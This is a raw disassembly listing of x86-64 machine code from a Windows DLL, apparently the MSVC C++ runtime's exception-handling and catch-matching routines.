   18000408a:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   18000408e:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   180004093:	8b 44 08 04          	mov    0x4(%rax,%rcx,1),%eax
   180004097:	48 83 c4 20          	add    $0x20,%rsp
   18000409b:	5b                   	pop    %rbx
   18000409c:	c3                   	ret
   18000409d:	cc                   	int3
   18000409e:	cc                   	int3
   18000409f:	cc                   	int3
   1800040a0:	48 63 52 1c          	movslq 0x1c(%rdx),%rdx
   1800040a4:	48 8b 01             	mov    (%rcx),%rax
   1800040a7:	44 89 04 02          	mov    %r8d,(%rdx,%rax,1)
   1800040ab:	c3                   	ret
   1800040ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800040b1:	57                   	push   %rdi
   1800040b2:	48 83 ec 20          	sub    $0x20,%rsp
   1800040b6:	41 8b f9             	mov    %r9d,%edi
   1800040b9:	49 8b d8             	mov    %r8,%rbx
   1800040bc:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1800040c1:	e8 12 f2 ff ff       	call   0x1800032d8
   1800040c6:	48 8b 08             	mov    (%rax),%rcx
   1800040c9:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   1800040cd:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1800040d2:	3b 7c 08 04          	cmp    0x4(%rax,%rcx,1),%edi
   1800040d6:	7e 04                	jle    0x1800040dc
   1800040d8:	89 7c 08 04          	mov    %edi,0x4(%rax,%rcx,1)
   1800040dc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800040e1:	48 83 c4 20          	add    $0x20,%rsp
   1800040e5:	5f                   	pop    %rdi
   1800040e6:	c3                   	ret
   1800040e7:	cc                   	int3
   1800040e8:	4c 8b 02             	mov    (%rdx),%r8
   1800040eb:	e9 00 00 00 00       	jmp    0x1800040f0
   1800040f0:	40 53                	rex push %rbx
   1800040f2:	48 83 ec 20          	sub    $0x20,%rsp
   1800040f6:	49 8b d8             	mov    %r8,%rbx
   1800040f9:	48 85 c9             	test   %rcx,%rcx
   1800040fc:	74 52                	je     0x180004150
   1800040fe:	4c 63 59 18          	movslq 0x18(%rcx),%r11
   180004102:	4c 8b 52 08          	mov    0x8(%rdx),%r10
   180004106:	4b 8d 04 13          	lea    (%r11,%r10,1),%rax
   18000410a:	48 85 c0             	test   %rax,%rax
   18000410d:	74 41                	je     0x180004150
   18000410f:	44 8b 41 14          	mov    0x14(%rcx),%r8d
   180004113:	45 33 c9             	xor    %r9d,%r9d
   180004116:	45 85 c0             	test   %r8d,%r8d
   180004119:	74 30                	je     0x18000414b
   18000411b:	4b 8d 0c cb          	lea    (%r11,%r9,8),%rcx
   18000411f:	4a 63 14 11          	movslq (%rcx,%r10,1),%rdx
   180004123:	49 03 d2             	add    %r10,%rdx
   180004126:	48 3b da             	cmp    %rdx,%rbx
   180004129:	72 08                	jb     0x180004133
   18000412b:	41 ff c1             	inc    %r9d
   18000412e:	45 3b c8             	cmp    %r8d,%r9d
   180004131:	72 e8                	jb     0x18000411b
   180004133:	45 85 c9             	test   %r9d,%r9d
   180004136:	74 13                	je     0x18000414b
   180004138:	41 8d 49 ff          	lea    -0x1(%r9),%ecx
   18000413c:	49 8d 04 cb          	lea    (%r11,%rcx,8),%rax
   180004140:	42 8b 44 10 04       	mov    0x4(%rax,%r10,1),%eax
   180004145:	48 83 c4 20          	add    $0x20,%rsp
   180004149:	5b                   	pop    %rbx
   18000414a:	c3                   	ret
   18000414b:	83 c8 ff             	or     $0xffffffff,%eax
   18000414e:	eb f5                	jmp    0x180004145
   180004150:	e8 9f 7c 00 00       	call   0x18000bdf4
   180004155:	cc                   	int3
   180004156:	cc                   	int3
   180004157:	cc                   	int3
   180004158:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000415d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180004162:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180004167:	41 55                	push   %r13
   180004169:	41 56                	push   %r14
   18000416b:	41 57                	push   %r15
   18000416d:	48 83 ec 30          	sub    $0x30,%rsp
   180004171:	4d 8b f1             	mov    %r9,%r14
   180004174:	49 8b d8             	mov    %r8,%rbx
   180004177:	48 8b f2             	mov    %rdx,%rsi
   18000417a:	4c 8b e9             	mov    %rcx,%r13
   18000417d:	33 ff                	xor    %edi,%edi
   18000417f:	41 39 78 04          	cmp    %edi,0x4(%r8)
   180004183:	74 0f                	je     0x180004194
   180004185:	4d 63 78 04          	movslq 0x4(%r8),%r15
   180004189:	e8 ea f4 ff ff       	call   0x180003678
   18000418e:	49 8d 14 07          	lea    (%r15,%rax,1),%rdx
   180004192:	eb 06                	jmp    0x18000419a
   180004194:	48 8b d7             	mov    %rdi,%rdx
   180004197:	44 8b ff             	mov    %edi,%r15d
   18000419a:	48 85 d2             	test   %rdx,%rdx
   18000419d:	0f 84 77 01 00 00    	je     0x18000431a
   1800041a3:	45 85 ff             	test   %r15d,%r15d
   1800041a6:	74 11                	je     0x1800041b9
   1800041a8:	e8 cb f4 ff ff       	call   0x180003678
   1800041ad:	48 8b c8             	mov    %rax,%rcx
   1800041b0:	48 63 43 04          	movslq 0x4(%rbx),%rax
   1800041b4:	48 03 c8             	add    %rax,%rcx
   1800041b7:	eb 03                	jmp    0x1800041bc
   1800041b9:	48 8b cf             	mov    %rdi,%rcx
   1800041bc:	40 38 79 10          	cmp    %dil,0x10(%rcx)
   1800041c0:	0f 84 54 01 00 00    	je     0x18000431a
   1800041c6:	39 7b 08             	cmp    %edi,0x8(%rbx)
   1800041c9:	75 08                	jne    0x1800041d3
   1800041cb:	39 3b                	cmp    %edi,(%rbx)
   1800041cd:	0f 8d 47 01 00 00    	jge    0x18000431a
   1800041d3:	39 3b                	cmp    %edi,(%rbx)
   1800041d5:	7c 0a                	jl     0x1800041e1
   1800041d7:	48 63 43 08          	movslq 0x8(%rbx),%rax
   1800041db:	48 03 06             	add    (%rsi),%rax
   1800041de:	48 8b f0             	mov    %rax,%rsi
   1800041e1:	f6 03 80             	testb  $0x80,(%rbx)
   1800041e4:	74 32                	je     0x180004218
   1800041e6:	41 f6 06 10          	testb  $0x10,(%r14)
   1800041ea:	74 2c                	je     0x180004218
   1800041ec:	48 8b 05 a5 ff 01 00 	mov    0x1ffa5(%rip),%rax        # 0x180024198
   1800041f3:	48 85 c0             	test   %rax,%rax
   1800041f6:	74 20                	je     0x180004218
   1800041f8:	ff 15 b2 40 01 00    	call   *0x140b2(%rip)        # 0x1800182b0
   1800041fe:	48 85 c0             	test   %rax,%rax
   180004201:	0f 84 2f 01 00 00    	je     0x180004336
   180004207:	48 85 f6             	test   %rsi,%rsi
   18000420a:	0f 84 26 01 00 00    	je     0x180004336
   180004210:	48 89 06             	mov    %rax,(%rsi)
   180004213:	48 8b c8             	mov    %rax,%rcx
   180004216:	eb 5f                	jmp    0x180004277
   180004218:	f6 03 08             	testb  $0x8,(%rbx)
   18000421b:	74 1b                	je     0x180004238
   18000421d:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   180004221:	48 85 c9             	test   %rcx,%rcx
   180004224:	0f 84 11 01 00 00    	je     0x18000433b
   18000422a:	48 85 f6             	test   %rsi,%rsi
   18000422d:	0f 84 08 01 00 00    	je     0x18000433b
   180004233:	48 89 0e             	mov    %rcx,(%rsi)
   180004236:	eb 3f                	jmp    0x180004277
   180004238:	41 f6 06 01          	testb  $0x1,(%r14)
   18000423c:	74 4a                	je     0x180004288
   18000423e:	49 8b 55 28          	mov    0x28(%r13),%rdx
   180004242:	48 85 d2             	test   %rdx,%rdx
   180004245:	0f 84 f5 00 00 00    	je     0x180004340
   18000424b:	48 85 f6             	test   %rsi,%rsi
   18000424e:	0f 84 ec 00 00 00    	je     0x180004340
   180004254:	4d 63 46 14          	movslq 0x14(%r14),%r8
   180004258:	48 8b ce             	mov    %rsi,%rcx
   18000425b:	e8 a0 18 00 00       	call   0x180005b00
   180004260:	41 83 7e 14 08       	cmpl   $0x8,0x14(%r14)
   180004265:	0f 85 ab 00 00 00    	jne    0x180004316
   18000426b:	48 39 3e             	cmp    %rdi,(%rsi)
   18000426e:	0f 84 a2 00 00 00    	je     0x180004316
   180004274:	48 8b 0e             	mov    (%rsi),%rcx
   180004277:	49 8d 56 08          	lea    0x8(%r14),%rdx
   18000427b:	e8 34 f6 ff ff       	call   0x1800038b4
   180004280:	48 89 06             	mov    %rax,(%rsi)
   180004283:	e9 8e 00 00 00       	jmp    0x180004316
   180004288:	41 39 7e 18          	cmp    %edi,0x18(%r14)
   18000428c:	74 0f                	je     0x18000429d
   18000428e:	49 63 5e 18          	movslq 0x18(%r14),%rbx
   180004292:	e8 f5 f3 ff ff       	call   0x18000368c
   180004297:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   18000429b:	eb 05                	jmp    0x1800042a2
   18000429d:	48 8b cf             	mov    %rdi,%rcx
   1800042a0:	8b df                	mov    %edi,%ebx
   1800042a2:	48 85 c9             	test   %rcx,%rcx
   1800042a5:	75 34                	jne    0x1800042db
   1800042a7:	49 39 7d 28          	cmp    %rdi,0x28(%r13)
   1800042ab:	0f 84 94 00 00 00    	je     0x180004345
   1800042b1:	48 85 f6             	test   %rsi,%rsi
   1800042b4:	0f 84 8b 00 00 00    	je     0x180004345
   1800042ba:	49 63 5e 14          	movslq 0x14(%r14),%rbx
   1800042be:	49 8d 56 08          	lea    0x8(%r14),%rdx
   1800042c2:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   1800042c6:	e8 e9 f5 ff ff       	call   0x1800038b4
   1800042cb:	48 8b d0             	mov    %rax,%rdx
   1800042ce:	4c 8b c3             	mov    %rbx,%r8
   1800042d1:	48 8b ce             	mov    %rsi,%rcx
   1800042d4:	e8 27 18 00 00       	call   0x180005b00
   1800042d9:	eb 3b                	jmp    0x180004316
   1800042db:	49 39 7d 28          	cmp    %rdi,0x28(%r13)
   1800042df:	74 69                	je     0x18000434a
   1800042e1:	48 85 f6             	test   %rsi,%rsi
   1800042e4:	74 64                	je     0x18000434a
   1800042e6:	85 db                	test   %ebx,%ebx
   1800042e8:	74 11                	je     0x1800042fb
   1800042ea:	e8 9d f3 ff ff       	call   0x18000368c
   1800042ef:	48 8b c8             	mov    %rax,%rcx
   1800042f2:	49 63 46 18          	movslq 0x18(%r14),%rax
   1800042f6:	48 03 c8             	add    %rax,%rcx
   1800042f9:	eb 03                	jmp    0x1800042fe
   1800042fb:	48 8b cf             	mov    %rdi,%rcx
   1800042fe:	48 85 c9             	test   %rcx,%rcx
   180004301:	74 47                	je     0x18000434a
   180004303:	41 8a 06             	mov    (%r14),%al
   180004306:	24 04                	and    $0x4,%al
   180004308:	f6 d8                	neg    %al
   18000430a:	1b c9                	sbb    %ecx,%ecx
   18000430c:	f7 d9                	neg    %ecx
   18000430e:	ff c1                	inc    %ecx
   180004310:	8b f9                	mov    %ecx,%edi
   180004312:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   180004316:	8b c7                	mov    %edi,%eax
   180004318:	eb 02                	jmp    0x18000431c
   18000431a:	33 c0                	xor    %eax,%eax
   18000431c:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180004321:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   180004326:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   18000432b:	48 83 c4 30          	add    $0x30,%rsp
   18000432f:	41 5f                	pop    %r15
   180004331:	41 5e                	pop    %r14
   180004333:	41 5d                	pop    %r13
   180004335:	c3                   	ret
   180004336:	e8 b9 7a 00 00       	call   0x18000bdf4
   18000433b:	e8 b4 7a 00 00       	call   0x18000bdf4
   180004340:	e8 af 7a 00 00       	call   0x18000bdf4
   180004345:	e8 aa 7a 00 00       	call   0x18000bdf4
   18000434a:	e8 a5 7a 00 00       	call   0x18000bdf4
   18000434f:	90                   	nop
   180004350:	e8 9f 7a 00 00       	call   0x18000bdf4
   180004355:	90                   	nop
   180004356:	cc                   	int3
   180004357:	cc                   	int3
   180004358:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000435d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180004362:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180004367:	41 56                	push   %r14
   180004369:	48 83 ec 20          	sub    $0x20,%rsp
   18000436d:	49 8b f9             	mov    %r9,%rdi
   180004370:	4c 8b f1             	mov    %rcx,%r14
   180004373:	33 db                	xor    %ebx,%ebx
   180004375:	41 39 18             	cmp    %ebx,(%r8)
   180004378:	7d 05                	jge    0x18000437f
   18000437a:	48 8b f2             	mov    %rdx,%rsi
   18000437d:	eb 07                	jmp    0x180004386
   18000437f:	49 63 70 08          	movslq 0x8(%r8),%rsi
   180004383:	48 03 32             	add    (%rdx),%rsi
   180004386:	e8 cd fd ff ff       	call   0x180004158
   18000438b:	83 e8 01             	sub    $0x1,%eax
   18000438e:	74 3c                	je     0x1800043cc
   180004390:	83 f8 01             	cmp    $0x1,%eax
   180004393:	75 67                	jne    0x1800043fc
   180004395:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   180004399:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   18000439d:	e8 12 f5 ff ff       	call   0x1800038b4
   1800043a2:	4c 8b f0             	mov    %rax,%r14
   1800043a5:	39 5f 18             	cmp    %ebx,0x18(%rdi)
   1800043a8:	74 0c                	je     0x1800043b6
   1800043aa:	e8 dd f2 ff ff       	call   0x18000368c
   1800043af:	48 63 5f 18          	movslq 0x18(%rdi),%rbx
   1800043b3:	48 03 d8             	add    %rax,%rbx
   1800043b6:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1800043bc:	4d 8b c6             	mov    %r14,%r8
   1800043bf:	48 8b d3             	mov    %rbx,%rdx
   1800043c2:	48 8b ce             	mov    %rsi,%rcx
   1800043c5:	e8 1a 12 00 00       	call   0x1800055e4
   1800043ca:	eb 30                	jmp    0x1800043fc
   1800043cc:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   1800043d0:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   1800043d4:	e8 db f4 ff ff       	call   0x1800038b4
   1800043d9:	4c 8b f0             	mov    %rax,%r14
   1800043dc:	39 5f 18             	cmp    %ebx,0x18(%rdi)
   1800043df:	74 0c                	je     0x1800043ed
   1800043e1:	e8 a6 f2 ff ff       	call   0x18000368c
   1800043e6:	48 63 5f 18          	movslq 0x18(%rdi),%rbx
   1800043ea:	48 03 d8             	add    %rax,%rbx
   1800043ed:	4d 8b c6             	mov    %r14,%r8
   1800043f0:	48 8b d3             	mov    %rbx,%rdx
   1800043f3:	48 8b ce             	mov    %rsi,%rcx
   1800043f6:	e8 dd 11 00 00       	call   0x1800055d8
   1800043fb:	90                   	nop
   1800043fc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004401:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180004406:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   18000440b:	48 83 c4 20          	add    $0x20,%rsp
   18000440f:	41 5e                	pop    %r14
   180004411:	c3                   	ret
   180004412:	e8 dd 79 00 00       	call   0x18000bdf4
   180004417:	90                   	nop
   180004418:	48 8b c4             	mov    %rsp,%rax
   18000441b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000441f:	4c 89 40 18          	mov    %r8,0x18(%rax)
   180004423:	55                   	push   %rbp
   180004424:	56                   	push   %rsi
   180004425:	57                   	push   %rdi
   180004426:	41 54                	push   %r12
   180004428:	41 55                	push   %r13
   18000442a:	41 56                	push   %r14
   18000442c:	41 57                	push   %r15
   18000442e:	48 83 ec 60          	sub    $0x60,%rsp
   180004432:	4c 8b ac 24 c0 00 00 	mov    0xc0(%rsp),%r13
   180004439:	00 
   18000443a:	4d 8b f9             	mov    %r9,%r15
   18000443d:	4c 8b e2             	mov    %rdx,%r12
   180004440:	4c 8d 48 10          	lea    0x10(%rax),%r9
   180004444:	48 8b e9             	mov    %rcx,%rbp
   180004447:	4d 8b c5             	mov    %r13,%r8
   18000444a:	49 8b d7             	mov    %r15,%rdx
   18000444d:	49 8b cc             	mov    %r12,%rcx
   180004450:	e8 83 ee ff ff       	call   0x1800032d8
   180004455:	4c 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%r9
   18000445c:	00 
   18000445d:	4c 8b f0             	mov    %rax,%r14
   180004460:	48 8b b4 24 c8 00 00 	mov    0xc8(%rsp),%rsi
   180004467:	00 
   180004468:	4d 85 c9             	test   %r9,%r9
   18000446b:	74 0e                	je     0x18000447b
   18000446d:	4c 8b c6             	mov    %rsi,%r8
   180004470:	48 8b d0             	mov    %rax,%rdx
   180004473:	48 8b cd             	mov    %rbp,%rcx
   180004476:	e8 dd fe ff ff       	call   0x180004358
   18000447b:	48 8b 8c 24 d8 00 00 	mov    0xd8(%rsp),%rcx
   180004482:	00 
   180004483:	8b 59 08             	mov    0x8(%rcx),%ebx
   180004486:	8b 39                	mov    (%rcx),%edi
   180004488:	e8 eb f1 ff ff       	call   0x180003678
   18000448d:	48 63 4e 0c          	movslq 0xc(%rsi),%rcx
   180004491:	4d 8b ce             	mov    %r14,%r9
   180004494:	4c 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%r8
   18000449b:	00 
   18000449c:	48 03 c1             	add    %rcx,%rax
   18000449f:	8a 8c 24 f8 00 00 00 	mov    0xf8(%rsp),%cl
   1800044a6:	48 8b d5             	mov    %rbp,%rdx
   1800044a9:	88 4c 24 50          	mov    %cl,0x50(%rsp)
   1800044ad:	49 8b cc             	mov    %r12,%rcx
   1800044b0:	4c 89 7c 24 48       	mov    %r15,0x48(%rsp)
   1800044b5:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   1800044ba:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   1800044be:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   1800044c2:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   1800044c7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800044cc:	e8 13 f0 ff ff       	call   0x1800034e4
   1800044d1:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   1800044d8:	00 
   1800044d9:	48 83 c4 60          	add    $0x60,%rsp
   1800044dd:	41 5f                	pop    %r15
   1800044df:	41 5e                	pop    %r14
   1800044e1:	41 5d                	pop    %r13
   1800044e3:	41 5c                	pop    %r12
   1800044e5:	5f                   	pop    %rdi
   1800044e6:	5e                   	pop    %rsi
   1800044e7:	5d                   	pop    %rbp
   1800044e8:	c3                   	ret
   1800044e9:	cc                   	int3
   1800044ea:	cc                   	int3
   1800044eb:	cc                   	int3
   1800044ec:	40 55                	rex push %rbp
   1800044ee:	53                   	push   %rbx
   1800044ef:	56                   	push   %rsi
   1800044f0:	57                   	push   %rdi
   1800044f1:	41 54                	push   %r12
   1800044f3:	41 55                	push   %r13
   1800044f5:	41 56                	push   %r14
   1800044f7:	41 57                	push   %r15
   1800044f9:	48 8d 6c 24 d8       	lea    -0x28(%rsp),%rbp
   1800044fe:	48 81 ec 28 01 00 00 	sub    $0x128,%rsp
   180004505:	48 8b 05 04 eb 01 00 	mov    0x1eb04(%rip),%rax        # 0x180023010
   18000450c:	48 33 c4             	xor    %rsp,%rax
   18000450f:	48 89 45 10          	mov    %rax,0x10(%rbp)
   180004513:	48 8b 85 a8 00 00 00 	mov    0xa8(%rbp),%rax
   18000451a:	4c 8b e2             	mov    %rdx,%r12
   18000451d:	48 8b bd 90 00 00 00 	mov    0x90(%rbp),%rdi
   180004524:	4d 8b f8             	mov    %r8,%r15
   180004527:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
   18000452c:	48 8b d9             	mov    %rcx,%rbx
   18000452f:	48 89 55 80          	mov    %rdx,-0x80(%rbp)
   180004533:	45 32 ed             	xor    %r13b,%r13b
   180004536:	4c 8b c7             	mov    %rdi,%r8
   180004539:	48 89 45 88          	mov    %rax,-0x78(%rbp)
   18000453d:	49 8b cc             	mov    %r12,%rcx
   180004540:	c6 44 24 61 00       	movb   $0x0,0x61(%rsp)
   180004545:	49 8b d1             	mov    %r9,%rdx
   180004548:	44 88 6c 24 60       	mov    %r13b,0x60(%rsp)
   18000454d:	49 8b f1             	mov    %r9,%rsi
   180004550:	e8 73 0e 00 00       	call   0x1800053c8
   180004555:	44 8b f0             	mov    %eax,%r14d
   180004558:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000455b:	0f 8c 75 04 00 00    	jl     0x1800049d6
   180004561:	3b 47 04             	cmp    0x4(%rdi),%eax
   180004564:	0f 8d 6c 04 00 00    	jge    0x1800049d6
   18000456a:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   180004570:	0f 85 c9 00 00 00    	jne    0x18000463f
   180004576:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   18000457a:	0f 85 bf 00 00 00    	jne    0x18000463f
   180004580:	8b 43 20             	mov    0x20(%rbx),%eax
   180004583:	2d 20 05 93 19       	sub    $0x19930520,%eax
   180004588:	83 f8 02             	cmp    $0x2,%eax
   18000458b:	0f 87 ae 00 00 00    	ja     0x18000463f
   180004591:	48 83 7b 30 00       	cmpq   $0x0,0x30(%rbx)
   180004596:	0f 85 a3 00 00 00    	jne    0x18000463f
   18000459c:	e8 63 f9 ff ff       	call   0x180003f04
   1800045a1:	48 83 78 20 00       	cmpq   $0x0,0x20(%rax)
   1800045a6:	0f 84 c3 03 00 00    	je     0x18000496f
   1800045ac:	e8 53 f9 ff ff       	call   0x180003f04
   1800045b1:	48 8b 58 20          	mov    0x20(%rax),%rbx
   1800045b5:	e8 4a f9 ff ff       	call   0x180003f04
   1800045ba:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   1800045be:	c6 44 24 61 01       	movb   $0x1,0x61(%rsp)
   1800045c3:	4c 8b 78 28          	mov    0x28(%rax),%r15
   1800045c7:	4c 89 7c 24 68       	mov    %r15,0x68(%rsp)
   1800045cc:	e8 e7 f0 ff ff       	call   0x1800036b8
   1800045d1:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   1800045d7:	75 1e                	jne    0x1800045f7
   1800045d9:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   1800045dd:	75 18                	jne    0x1800045f7
   1800045df:	8b 43 20             	mov    0x20(%rbx),%eax
   1800045e2:	2d 20 05 93 19       	sub    $0x19930520,%eax
   1800045e7:	83 f8 02             	cmp    $0x2,%eax
   1800045ea:	77 0b                	ja     0x1800045f7
   1800045ec:	48 83 7b 30 00       	cmpq   $0x0,0x30(%rbx)
   1800045f1:	0f 84 df 03 00 00    	je     0x1800049d6
   1800045f7:	e8 08 f9 ff ff       	call   0x180003f04
   1800045fc:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
   180004601:	74 3c                	je     0x18000463f
   180004603:	e8 fc f8 ff ff       	call   0x180003f04
   180004608:	4c 8b 78 38          	mov    0x38(%rax),%r15
   18000460c:	e8 f3 f8 ff ff       	call   0x180003f04
   180004611:	49 8b d7             	mov    %r15,%rdx
   180004614:	48 8b cb             	mov    %rbx,%rcx
   180004617:	48 83 60 38 00       	andq   $0x0,0x38(%rax)
   18000461c:	e8 3f 0e 00 00       	call   0x180005460
   180004621:	84 c0                	test   %al,%al
   180004623:	75 15                	jne    0x18000463a
   180004625:	49 8b cf             	mov    %r15,%rcx
   180004628:	e8 23 0f 00 00       	call   0x180005550
   18000462d:	84 c0                	test   %al,%al
   18000462f:	0f 84 7e 03 00 00    	je     0x1800049b3
   180004635:	e9 55 03 00 00       	jmp    0x18000498f
   18000463a:	4c 8b 7c 24 68       	mov    0x68(%rsp),%r15
   18000463f:	48 8b 46 08          	mov    0x8(%rsi),%rax
   180004643:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   180004647:	48 89 7d b8          	mov    %rdi,-0x48(%rbp)
   18000464b:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   180004651:	0f 85 cb 02 00 00    	jne    0x180004922
   180004657:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   18000465b:	0f 85 c1 02 00 00    	jne    0x180004922
   180004661:	8b 43 20             	mov    0x20(%rbx),%eax
   180004664:	2d 20 05 93 19       	sub    $0x19930520,%eax
   180004669:	83 f8 02             	cmp    $0x2,%eax
   18000466c:	0f 87 b0 02 00 00    	ja     0x180004922
   180004672:	83 7f 0c 00          	cmpl   $0x0,0xc(%rdi)
   180004676:	0f 86 d6 01 00 00    	jbe    0x180004852
   18000467c:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   180004682:	48 8d 55 b8          	lea    -0x48(%rbp),%rdx
   180004686:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000468a:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   18000468e:	4c 8b ce             	mov    %rsi,%r9
   180004691:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180004696:	45 8b c6             	mov    %r14d,%r8d
   180004699:	e8 06 ed ff ff       	call   0x1800033a4
   18000469e:	0f 10 45 d8          	movups -0x28(%rbp),%xmm0
   1800046a2:	f3 0f 7f 45 c8       	movdqu %xmm0,-0x38(%rbp)
   1800046a7:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   1800046ac:	66 0f 7e c0          	movd   %xmm0,%eax
   1800046b0:	3b 45 f0             	cmp    -0x10(%rbp),%eax
   1800046b3:	0f 83 99 01 00 00    	jae    0x180004852
   1800046b9:	4c 8b 4d d8          	mov    -0x28(%rbp),%r9
   1800046bd:	44 8b 65 d0          	mov    -0x30(%rbp),%r12d
   1800046c1:	4c 89 4c 24 78       	mov    %r9,0x78(%rsp)
   1800046c6:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
   1800046ca:	48 8b 00             	mov    (%rax),%rax
   1800046cd:	48 63 50 10          	movslq 0x10(%rax),%rdx
   1800046d1:	41 8b c4             	mov    %r12d,%eax
   1800046d4:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1800046d8:	49 8b 41 08          	mov    0x8(%r9),%rax
   1800046dc:	4c 8d 04 8a          	lea    (%rdx,%rcx,4),%r8
   1800046e0:	41 0f 10 04 00       	movups (%r8,%rax,1),%xmm0
   1800046e5:	49 63 4c 00 10       	movslq 0x10(%r8,%rax,1),%rcx
   1800046ea:	89 4d b0             	mov    %ecx,-0x50(%rbp)
   1800046ed:	66 0f 7e c0          	movd   %xmm0,%eax
   1800046f1:	0f 11 45 a0          	movups %xmm0,-0x60(%rbp)
   1800046f5:	41 3b c6             	cmp    %r14d,%eax
   1800046f8:	0f 8f 3a 01 00 00    	jg     0x180004838
   1800046fe:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
   180004702:	48 c1 e8 20          	shr    $0x20,%rax
   180004706:	44 3b f0             	cmp    %eax,%r14d
   180004709:	0f 8f 29 01 00 00    	jg     0x180004838
   18000470f:	4c 8b 7d a8          	mov    -0x58(%rbp),%r15
   180004713:	48 8b d1             	mov    %rcx,%rdx
   180004716:	48 03 56 08          	add    0x8(%rsi),%rdx
   18000471a:	45 33 ed             	xor    %r13d,%r13d
   18000471d:	49 c1 ef 20          	shr    $0x20,%r15
   180004721:	48 89 55 98          	mov    %rdx,-0x68(%rbp)
   180004725:	45 85 ff             	test   %r15d,%r15d
   180004728:	0f 84 05 01 00 00    	je     0x180004833
   18000472e:	4a 8d 0c ad 00 00 00 	lea    0x0(,%r13,4),%rcx
   180004735:	00 
   180004736:	49 03 cd             	add    %r13,%rcx
   180004739:	0f 10 04 8a          	movups (%rdx,%rcx,4),%xmm0
   18000473d:	0f 11 45 f8          	movups %xmm0,-0x8(%rbp)
   180004741:	8b 44 8a 10          	mov    0x10(%rdx,%rcx,4),%eax
   180004745:	89 45 08             	mov    %eax,0x8(%rbp)
   180004748:	e8 3f ef ff ff       	call   0x18000368c
   18000474d:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   180004751:	48 83 c0 04          	add    $0x4,%rax
   180004755:	48 63 51 0c          	movslq 0xc(%rcx),%rdx
   180004759:	48 03 c2             	add    %rdx,%rax
   18000475c:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   180004761:	e8 26 ef ff ff       	call   0x18000368c
   180004766:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   18000476a:	48 63 51 0c          	movslq 0xc(%rcx),%rdx
   18000476e:	8b 0c 10             	mov    (%rax,%rdx,1),%ecx
   180004771:	89 4c 24 64          	mov    %ecx,0x64(%rsp)
   180004775:	85 c9                	test   %ecx,%ecx
   180004777:	7e 3c                	jle    0x1800047b5
   180004779:	e8 0e ef ff ff       	call   0x18000368c
   18000477e:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   180004783:	4c 8b 43 30          	mov    0x30(%rbx),%r8
   180004787:	48 63 09             	movslq (%rcx),%rcx
   18000478a:	48 03 c1             	add    %rcx,%rax
   18000478d:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   180004791:	48 8b d0             	mov    %rax,%rdx
   180004794:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   180004798:	e8 57 04 00 00       	call   0x180004bf4
   18000479d:	85 c0                	test   %eax,%eax
   18000479f:	75 25                	jne    0x1800047c6
   1800047a1:	8b 44 24 64          	mov    0x64(%rsp),%eax
   1800047a5:	48 83 44 24 70 04    	addq   $0x4,0x70(%rsp)
   1800047ab:	ff c8                	dec    %eax
   1800047ad:	89 44 24 64          	mov    %eax,0x64(%rsp)
   1800047b1:	85 c0                	test   %eax,%eax
   1800047b3:	7f c4                	jg     0x180004779
   1800047b5:	41 ff c5             	inc    %r13d
